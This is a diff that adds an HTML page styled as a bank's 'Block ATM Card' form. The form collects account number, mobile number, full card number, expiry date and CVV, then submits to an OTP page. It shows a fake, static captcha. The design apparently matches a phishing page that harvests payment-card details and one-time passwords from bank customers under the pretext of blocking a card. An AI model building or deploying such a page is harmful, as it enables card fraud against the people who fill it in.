@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <style>
+      * {
+        margin: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+      body {
+         display: flex;
+        justify-content: start;
+        align-items: center; 
+        flex-direction: column;
+        
+       
+        height: 100vh;
+      }
+      .container{
+        width: 100%;
+        height: 100vh;
+      }
+      .heading1{
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background-image: url('img/row-1-column-1 (1).jpg');
+        height:60px;
+        border-top: 8px solid white;
+        
+      }
+      .heading1 h2{
+        font-size: large;
+        font-weight: bolder;
+        font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+        color: #00B5EF;
+        margin-bottom: 2px;
+        
+      }
+      .heading1 p{
+        font-style: italic;
+        font-size: small;
+        color: rgb(232, 161, 46);
+      }
+      .formContainer {
+        display: flex;
+        flex-direction: column;
+        flex-wrap: nowrap;
+        justify-content: flex-start;
+        height: auto;
+        
+      }
+      input{
+        height: 35px;
+        padding: 10px;
+        border-radius: 4px;
+        border:1px solid rgb(99, 97, 97) ;
+        
+
+      }
+      select{
+        width: 100%;
+        height: 35px;
+        border-radius: 4px;
+        border:1px solid rgb(99, 97, 97) ;
+        }
+        option{
+          width: 50%;
+        }
+       .input-fieldc span {
+        display: block;
+        width:100 ;
+        margin-bottom: 7px;
+        font-size: small;
+        font-weight: bold;
+
+      }
+      .input-field1 {
+        display: flex;
+      }
+      .input-field {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        height: auto;
+        margin: 10px 0 5px 0;
+        
+      }
+      .input-fieldf {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        height: auto;
+        margin: 0 0 5px 0;
+        background-image: url('img/row-2-column-1.jpg');
+        
+        
+      }
+      .input-fieldc input {
+        width: 100%;
+        padding: 10px;
+        
+      }
+
+    .input-fieldc{
+        width: 85%;
+        margin-left: 12px;
+    }
+    .input-field1{
+        display: flex;
+        justify-content: center;
+        width: 90%;
+    }
+    .input-field2{
+        width: 85%;
+        margin-left: 12px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .input-fieldc3{
+        width: 50%;
+    }
+    .input-fieldc3 input{
+        width: 80%;
+        padding: 10px;
+        background-color: #d7fef6;
+    }
+    .input-fieldc3 span{
+        display: block;
+        margin-bottom: 10px;
+        font-size: small;
+        font-weight: bold;
+    }
+    #left{
+        display: flex;
+        flex-direction: column;
+        align-items: flex-end;
+    }
+    .input-submit{
+        display: flex;
+        justify-content: center;
+        margin-top: 15px;
+    }
+    .input-submit input{
+        width: 20%;
+        height: 30px;
+        margin: 5px;
+        padding: 5px;
+        background-color: #f2951c;
+        color: white;
+        font-weight: bold;
+        border: none;
+        
+    } 
+    .capt{
+        border: 2px solid black;
+        height: 30px;
+        width: 33%;
+        margin-left: calc(10% - 1px);
+        text-align: center;
+        background-color: #d7fef6;
+    }
+    .capt p{
+     padding-top: 5px;
+     text-decoration: line-through;
+    }
+    .btm{
+    display: flex;
+    /* justify-content: center; */
+    align-items: center;
+    margin-top: 10px;
+    width: 100%;
+    height:40px;
+    background-color: #fcf6ea;
+    box-shadow:0 2px 10px 2px rgb(138, 137, 137),0 5px 10px 2px #aae5f8 ;
+
+    font-size: small;
+
+    
+    }
+    .btm p{
+      padding-left: 10px;
+    }
+    .img{
+      width:100vw;
+      height:fit-content;
+      display: flex;
+      justify-content: center;
+      border-bottom: 6px solid #00B5EF;
+    }
+    .img img{
+      width: 80%;
+      height: 80px;
+    }
+
+   
+    </style>
+  </head>
+  <body>
+    <div class="img">
+      <img src="img\Capture3.JPG" alt="">
+    </div>
+    <div class="container">
+        <form action="otp.html" method="post">
+            <div class="heading1">
+                <h2>Block ATM Card</h2>
+                <p>Mandetary fields are marked in asterisk(*)</p>
+              </div>
+              <div class="formContainer">
+                <div class="input-fieldf">
+                  <div class="input-fieldc">
+                    <span>Account Number <font color="#00B5EF">*</font> </span>
+                    <input type="text" />
+                  </div>
+                </div>
+                <div class="input-field">
+                    <div class="input-fieldc">
+                      <span>Country</span>
+                      <select name="countries" form="carform">
+                        <option value="">--Select a country--</option>
+                        <option value="Afghanistan">Afghanistan</option>
+                        <option value="Albania">Albania</option>
+                        <option value="Algeria">Algeria</option>
+                        <option value="Andorra">Andorra</option>
+                        <option value="Angola">Angola</option>
+                        <option value="Antigua and Barbuda">Antigua and Barbuda</option>
+                        <option value="Argentina">Argentina</option>
+                        <option value="Armenia">Armenia</option>
+                        <option value="Australia">Australia</option>
+                        <option value="Austria">Austria</option>
+                        <option value="Azerbaijan">Azerbaijan</option>
+                        <option value="Bahamas">Bahamas</option>
+                        <option value="Bahrain">Bahrain</option>
+                        <option value="Bangladesh">Bangladesh</option>
+                        <option value="Barbados">Barbados</option>
+                        <option value="Belarus">Belarus</option>
+                        <option value="Belgium">Belgium</option>
+                        <option value="Belize">Belize</option>
+                        <option value="Benin">Benin</option>
+                        <option value="Bhutan">Bhutan</option>
+                        <option value="Bolivia">Bolivia</option>
+                        <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
+                        <option value="Botswana">Botswana</option>
+                        <option value="Brazil">Brazil</option>
+                        <option value="Brunei">Brunei</option>
+                        <option value="Bulgaria">Bulgaria</option>
+                        <option value="Burkina Faso">Burkina Faso</option>
+                        <option value="Burundi">Burundi</option>
+                        <option value="Cabo Verde">Cabo Verde</option>
+                        <option value="Cambodia">Cambodia</option>
+                        <option value="Cameroon">Cameroon</option>
+                        <option value="Canada">Canada</option>
+                        <option value="Central African Republic">Central African Republic</option>
+                        <option value="Chad">Chad</option>
+                        <option value="Chile">Chile</option>
+                        <option value="China">China</option>
+                        <option value="Colombia">Colombia</option>
+                        <option value="Comoros">Comoros</option>
+                        <option value="Congo (Congo-Brazzaville)">Congo (Congo-Brazzaville)</option>
+                        <option value="Costa Rica">Costa Rica</option>
+                        <option value="Croatia">Croatia</option>
+                        <option value="Cuba">Cuba</option>
+                        <option value="Cyprus">Cyprus</option>
+                        <option value="Czech Republic">Czech Republic</option>
+                        <option value="Denmark">Denmark</option>
+                        <option value="Djibouti">Djibouti</option>
+                        <option value="Dominica">Dominica</option>
+                        <option value="Dominican Republic">Dominican Republic</option>
+                        <option value="Ecuador">Ecuador</option>
+                        <option value="Egypt">Egypt</option>
+                        <option value="El Salvador">El Salvador</option>
+                        <option value="Equatorial Guinea">Equatorial Guinea</option>
+                        <option value="Eritrea">Eritrea</option>
+                        <option value="Estonia">Estonia</option>
+                        <option value="Eswatini">Eswatini</option>
+                        <option value="Ethiopia">Ethiopia</option>
+                        <option value="Fiji">Fiji</option>
+                        <option value="Finland">Finland</option>
+                        <option value="France">France</option>
+                        <option value="Gabon">Gabon</option>
+                        <option value="Gambia">Gambia</option>
+                        <option value="Georgia">Georgia</option>
+                        <option value="Germany">Germany</option>
+                        <option value="Ghana">Ghana</option>
+                        <option value="Greece">Greece</option>
+                        <option value="Grenada">Grenada</option>
+                        <option value="Guatemala">Guatemala</option>
+                        <option value="Guinea">Guinea</option>
+                        <option value="Guyana">Guyana</option>
+                        <option value="Haiti">Haiti</option>
+                        <option value="Honduras">Honduras</option>
+                        <option value="Hungary">Hungary</option>
+                        <option value="Iceland">Iceland</option>
+                        <option value="India">India</option>
+                        <option value="Indonesia">Indonesia</option>
+                        <option value="Iran">Iran</option>
+                        <option value="Iraq">Iraq</option>
+                        <option value="Ireland">Ireland</option>
+                        <option value="Israel">Israel</option>
+                        <option value="Italy">Italy</option>
+                        <option value="Jamaica">Jamaica</option>
+                        <option value="Japan">Japan</option>
+                        <option value="Jordan">Jordan</option>
+                        <option value="Kazakhstan">Kazakhstan</option>
+                        <option value="Kenya">Kenya</option>
+                        <option value="Kiribati">Kiribati</option>
+                        <option value="South Africa">South Africa</option>
+                        <option value="South Korea">South Korea</option>
+                        <option value="United Kingdom">United Kingdom</option>
+                        <option value="United States">United States</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="input-field">
+                    <div class="input-fieldc">
+                      <span>Registered Mobile Number <font color="#00B5EF">*</font></span>
+                      <input type="number" />
+                    </div>
+                  </div>
+                  <div class="input-field">
+                    <div class="input-fieldc">
+                      <span>Card No <font color="#00B5EF">*</font></span>
+                      <input type="number" id="credit-card" name="credit-card"  maxlength="19" oninput="formatCreditCardNumber(event)"/>
+                    </div>
+                  </div>
+                <div class="input-field">
+                    <div class="input-field2">
+                  <div class="input-fieldc3">
+                    <span>Expiry Date <font color="#00B5EF">*</font></span>
+                    <input type="number" id="expiry-date" name="expiry-date"  maxlength="5" oninput="formatExpiryDate(event)" />
+                  </div>
+                  <div class="input-fieldc3" id="left">
+                    <span>CVV <small>(security code)</small> </span>
+                    <input type="number" />
+                </div> 
+                  </div>
+                </div>
+                <div class="input-field">
+                    <div class="input-fieldc">
+                      <span>Enter the text as shown in the image <font color="#00B5EF">*</font></span>
+                      <input type="text" />
+                    </div>
+              </div>
+              
+                <div class="capt">
+                    <p>8KMZPK</p>
+                  </div>
+             
+              
+              <div class="input-submit">
+                <input class="btn" type="submit">
+                <input class="btn1" type="reset">
+              </div>
+        </form>
+        <div class="btm" >
+           <p>&#x2022; Once card is blocked, you can't unlock it online.</p> 
+          
+        </div>
+      </div>
+     
+          <script>
+        const button =
+            document.querySelector('.btn');
+        button.addEventListener('click',
+            () => {
+                button.style.backgroundColor = 
+                    "#00B5EF";
+            });
+            document.querySelector('.btn1');
+        button.addEventListener('click',
+            () => {
+                button.style.backgroundColor = 
+                    "#00B5EF";
+            });
+            function formatCreditCardNumber(event) {
+            let input = event.target;
+            let value = input.value.replace(/\D/g, ''); // Remove non-digit characters
+            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Insert space every 4 digits
+            input.value = formattedValue;
+        }
+        function formatExpiryDate(event) {
+            let input = event.target;
+            let value = input.value.replace(/\D/g, ''); // Remove non-digit characters
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4); // Insert slash after MM
+            }
+            input.value = value;
+        } 
+    </script>
+     
+  </body>
+</html>
